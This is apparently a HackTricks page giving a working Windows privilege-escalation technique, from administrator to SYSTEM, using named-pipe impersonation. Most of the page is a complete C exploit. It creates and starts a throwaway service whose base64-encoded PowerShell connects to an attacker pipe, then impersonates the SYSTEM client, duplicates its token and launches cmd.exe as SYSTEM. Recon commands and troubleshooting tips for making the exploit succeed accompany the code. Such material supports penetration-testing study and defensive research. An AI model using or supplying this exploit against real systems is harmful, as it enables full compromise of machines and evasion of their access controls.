---
title: "From High Integrity to SYSTEM with Name Pipes"
source: hacktricks.wiki
source_url: https://hacktricks.wiki/windows-hardening/windows-local-privilege-escalation/from-high-integrity-to-system-with-name-pipes.html
fetched_at: 2026-09-20T09:50:19Z
license: unspecified
category: windows
---

```
whoami /groups | findstr /i "High Mandatory"
whoami /priv | findstr /i "SeImpersonatePrivilege"
sc.exe query PiperSrv
```
```
#include <windows.h>
#include <time.h>
#pragma comment (lib, "advapi32")
#pragma comment (lib, "kernel32")
#define PIPESRV "PiperSrv"
#define MESSAGE_SIZE 512
DWORD WINAPI ServiceGo(LPVOID lpParam) {
	SC_HANDLE scManager;
	SC_HANDLE scService;
	scManager = OpenSCManager(NULL, SERVICES_ACTIVE_DATABASE, SC_MANAGER_ALL_ACCESS);
	if (scManager == NULL) {
		return FALSE;
	}
	// create Piper service
	scService = CreateServiceA(scManager, PIPESRV, PIPESRV, SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS,
		SERVICE_DEMAND_START, SERVICE_ERROR_NORMAL,
		"C:\\Windows\\System32\\cmd.exe /c powershell.exe -EncodedCommand JABwAGkAcABlACAAPQAgAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAEkATwAuAFAAaQBwAGUAcwAuAE4AYQBtAGUAZABQAGkAcABlAEMAbABpAGUAbgB0AFMAdAByAGUAYQBtACgAIgBwAGkAcABlAHIAIgApADsAIAAkAHAAaQBwAGUALgBDAG8AbgBuAGUAYwB0ACgAKQA7ACAAJABzAHcAIAA9ACAAbgBlAHcALQBvAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ASQBPAC4AUwB0AHIAZQBhAG0AVwByAGkAdABlAHIAKAAkAHAAaQBwAGUAKQA7ACAAJABzAHcALgBXAHIAaQB0AGUATABpAG4AZQAoACIARwBvACIAKQA7ACAAJABzAHcALgBEAGkAcwBwAG8AcwBlACgAKQA7AA==",
		NULL, NULL, NULL, NULL, NULL);
	if (scService == NULL) {
		//printf("[!] CreateServiceA() failed: [%d]\n", GetLastError());
		return FALSE;
	}
	// launch it
	StartService(scService, 0, NULL);
	// wait a bit and then cleanup
	Sleep(10000);
	DeleteService(scService);
	CloseServiceHandle(scService);
	CloseServiceHandle(scManager);
}
int main() {
	LPCSTR sPipeName = "\\\\.\\pipe\\piper";
	HANDLE hSrvPipe;
	HANDLE th;
	BOOL bPipeConn;
	char pPipeBuf[MESSAGE_SIZE];
	DWORD dBRead = 0;
	HANDLE hImpToken;
	HANDLE hNewToken;
	STARTUPINFOW si;
	PROCESS_INFORMATION pi;
	// open pipe
	hSrvPipe = CreateNamedPipeA(sPipeName, PIPE_ACCESS_DUPLEX, PIPE_TYPE_MESSAGE | PIPE_WAIT,
		PIPE_UNLIMITED_INSTANCES, 1024, 1024, 0, NULL);
	// create and run service
	th = CreateThread(0, 0, ServiceGo, NULL, 0, 0);
	// wait for the connection from the service
	bPipeConn = ConnectNamedPipe(hSrvPipe, NULL);
	if (!bPipeConn && GetLastError() == ERROR_PIPE_CONNECTED) {
		bPipeConn = TRUE; // Client connected between CreateNamedPipe and ConnectNamedPipe
	}
	if (bPipeConn) {
		if (!ReadFile(hSrvPipe, &pPipeBuf, MESSAGE_SIZE, &dBRead, NULL) || dBRead == 0) {
			return -6;
		}
		// impersonate the service (SYSTEM)
		if (ImpersonateNamedPipeClient(hSrvPipe) == 0) {
			return -1;
		}
		// wait for the service to cleanup
		WaitForSingleObject(th, INFINITE);
		// get a handle to impersonated token
		if (!OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &hImpToken)) {
			return -2;
		}
		// create new primary token for new process
		if (!DuplicateTokenEx(hImpToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation,
			TokenPrimary, &hNewToken)) {
			return -4;
		}
		//Sleep(20000);
		// spawn cmd.exe as full SYSTEM user
		ZeroMemory(&si, sizeof(si));
		si.cb = sizeof(si);
		ZeroMemory(&pi, sizeof(pi));
		if (!CreateProcessWithTokenW(hNewToken, 0, L"C:\\Windows\\System32\\cmd.exe", NULL,
			CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi)) {
			return -5;
		}
		// revert back to original security context
		RevertToSelf();
	}
	return 0;
}
```
### Failure triage

- `ConnectNamedPipe == FALSE` with`ERROR_PIPE_CONNECTED` : continue; the pipe is already connected.<sup>[\[4\]](#references)</sup>
- `ImpersonateNamedPipeClient` fails with`ERROR_CANNOT_IMPERSONATE` (`1368` ): confirm the SYSTEM client actually wrote data and`ReadFile` completed. Also inspect the client’s requested impersonation level; identification/anonymous-level clients cannot be fully impersonated.<sup>[\[1\]](#references)</sup>
- `CreateProcessWithTokenW` fails with`ERROR_PRIVILEGE_NOT_HELD` (`1314` ): the original caller does not hold`SeImpersonatePrivilege` . From a high-integrity administrator context, use the token-copy route documented in[SeImpersonate from High To System](seimpersonate-from-high-to-system.html) , or use`CreateProcessAsUserW` while impersonating SYSTEM if its required privileges are present.<sup>[\[2\]](#references)</sup>
- `CreateServiceA` returns`ERROR_SERVICE_EXISTS` (`1073` ): delete the stale`PiperSrv` entry or randomize`PIPESRV` ; always delete the temporary service after the trigger.<sup>[\[3\]](#references)</sup>

## References

- [1] [Microsoft Learn — `ImpersonateNamedPipeClient`](https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-impersonatenamedpipeclient)
- [2] [Microsoft Learn — `CreateProcessWithTokenW`](https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithtokenw)
- [3] [Microsoft Learn — `CreateServiceA`](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-createservicea)
- [4] [Microsoft Learn — `ConnectNamedPipe`](https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-connectnamedpipe)
- [5] [Microsoft Learn — `DuplicateTokenEx`](https://learn.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-duplicatetokenex)
